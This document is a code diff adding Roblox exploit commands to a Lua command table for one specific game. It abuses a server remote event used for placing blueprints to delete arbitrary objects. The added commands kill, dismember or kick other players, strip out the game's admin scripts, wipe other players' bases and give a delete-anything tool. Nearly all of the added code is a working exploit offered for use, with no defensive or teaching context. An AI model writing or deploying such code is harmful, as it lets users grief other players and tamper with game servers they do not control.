@@ -4,6 +4,7 @@ local Commands = {}
 local HumanoidConnections = {}
 local OtherConnections = {}
 local Loops = {}
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
 local RS = game:GetService('RunService')
 local Players = game:GetService('Players')
 local HttpS = game:GetService('HttpService')
@@ -299,5 +300,190 @@ Commands[8737602449] = {
         end
     }
 }
+
+do
+    local DestroyFunction
+
+    local DestroyGames = {11093443900}
+
+    local LT2Method = {11093443900}
+
+    if table.find(LT2Method,game.PlaceId) then
+        DestroyFunction = function(...)
+            v = {...}
+            for i,v in next,v do
+                local args = {
+                    "",
+                    CFrame.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+                    Players.LocalPlayer,
+                    v,
+                    true
+                }
+
+                game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer(unpack(args))
+            end
+        end
+    end
+    for _,v in next,DestroyGames do
+        Commands[v] = {
+            {
+                Names = {'kill'},
+                Description = 'Kills Specified Targets',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    Players = Util.GetPlayer(Players)
+                    for _,Player in next,Players do
+                        DestroyFunction(Player.Character.Head)
+                    end
+                end
+            },
+            {
+                Names = {'deleteroot','delroot','delhrp','ragdoll'},
+                Description = 'Deletes the Targets HumanoidRootPart',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    Players = Util.GetPlayer(Players)
+                    for _,Player in next,Players do
+                        DestroyFunction(Player.Character.HumanoidRootPart)
+                    end
+                end
+            },
+            {
+                Names = {'deletehumanoid','delhum','delh'},
+                Description = 'Deletes the Targets Humanoid',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    Players = Util.GetPlayer(Players)
+                    for _,Player in next,Players do
+                        DestroyFunction(Player.Character.Humanoid)
+                    end
+                end
+            },
+            {
+                Names = {'kick'},
+                Description = 'Kicks the Target out of the game',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    Players = Util.GetPlayer(Players)
+                    for _,Player in next,Players do
+                        DestroyFunction(Player)
+                    end
+                end
+            },
+            {
+                Names = {'creeper','noarms'},
+                Description = 'Deletes the Targets Arms',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    Players = Util.GetPlayer(Players)
+                    for _,Player in next,Players do
+                        local R6 = Player.Character.Humanoid.RigType == Enum.RigType.R6
+                        DestroyFunction(R6 and (Player.Character:FindFirstChild('LeftArm'),Player.Character:FindFirstChild('RightArm')) or (Player.Character:FindFirstChild('LeftUpperArm'),Player.Character:FindFirstChild('RightUpperArm')))
+                    end
+                end
+            },
+            {
+                Names = {'nolegs'},
+                Description = 'Deletes the Targets Legs',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    Players = Util.GetPlayer(Players)
+                    for _,Player in next,Players do
+                        local R6 = Player.Character.Humanoid.RigType == Enum.RigType.R6
+                        DestroyFunction(R6 and (Player.Character:FindFirstChild('LeftLeg'),Player.Character:FindFirstChild('RightLeg')) or (Player.Character:FindFirstChild('LeftUpperLeg'),Player.Character:FindFirstChild('RightUpperLeg')))
+                    end
+                end
+            },
+            {
+                Names = {'RemoveAdmin','DeleteAdmin'},
+                Description = 'Deletes the Admin in the game if there is any',
+                Arguments = {},
+                Call = function()
+                    if ReplicatedStorage:FindFirstChild('\b\a\n\a\n\a') then
+                        DestroyFunction(ReplicatedStorage['\b\a\n\a\n\a'])
+                    end
+                    if ReplicatedStorage:FindFirstChild('HDAdminClient') then
+                        DestroyFunction(ReplicatedStorage['HDAdminClient'])
+                    end
+                end
+            },
+            {
+                Names = {'DeleteTool'},
+                Description = 'Gives a tool that lets you delete anything ',
+                Arguments = {},
+                Call = function()
+                    local Tool = Instance.new('Tool',plr.Backpack)
+                    Tool.Name = 'Delete'
+                    Tool.TextureId = 'rbxassetid://29402763'
+                    local MouseMove
+                    local GUI = Instance.new('ScreenGui',game.CoreGui)
+                    local Highlight = Instance.new('Highlight',GUI)
+                    local Target
+                    local TargetPos
+
+                    Highlight.Enabled = true
+                    Highlight.OutlineColor = Color3.new(1,.1,.1)
+                    Highlight.FillColor = Color3.new(1,.3,.3)
+                    Highlight.FillTransparency = .7
+                    Highlight.OutlineTransparency = 0
+                    Highlight.DepthMode = Enum.HighlightDepthMode.Occluded
+
+                    Tool.RequiresHandle = false
+
+                    Tool.Equipped:Connect(function(Mouse)
+                        MouseMove = game:GetService('UserInputService').InputChanged:Connect(function()
+                            if game:GetService('UserInputService'):IsKeyDown(Enum.KeyCode.LeftShift) then
+                                Target = Mouse.Target and Mouse.Target.Parent
+                                TargetPos = Mouse.Target.Position
+                            else
+                                Target = Mouse.Target
+                                TargetPos = Target.Position
+                            end
+                            Highlight.Adornee = Target
+                        end)
+                    end)
+                    Tool.Unequipped:Connect(function()
+                        MouseMove:Disconnect()
+                        Highlight.Adornee = nil
+                    end)
+                    Tool.Activated:Connect(function()
+                        local Explosion = Instance.new('Explosion',workspace)
+                        
+                        Explosion.Position = TargetPos
+                        Explosion.Visible = true
+                        Explosion.BlastPressure = 0
+                        Explosion.BlastRadius = 0
+                        Explosion.DestroyJointRadiusPercent = 0 
+                        DestroyFunction(Target)
+                    end)
+                end
+            }
+
+        }
+        for _,v in next,LT2Method do
+            local PlayerModels = workspace.PlayerModels
+            table.insert(Commands[v],{
+                Names = {'Wipe'},
+                Description = 'Wipes the Targets base',
+                Arguments = {'Player'},
+                Call = function(Players)
+                    for _,Item in next,PlayerModels:GetChildren() do
+                        if Item:FindFirstChild('Owner') and table.find(Players,Item.Owner.Value) then
+                            DestroyFunction(Item)
+                        end
+                    end
+                end
+            })
+            table.insert(Commands[v],{
+                Names = {'DeletePlayerModels'},
+                Description = 'Deletes PlayerModels Folder',
+                Arguments = {},
+                Call = function()
+                    DestroyFunction(PlayerModels)
+                end
+            })
+        end
+    end
+end
 
 return Commands
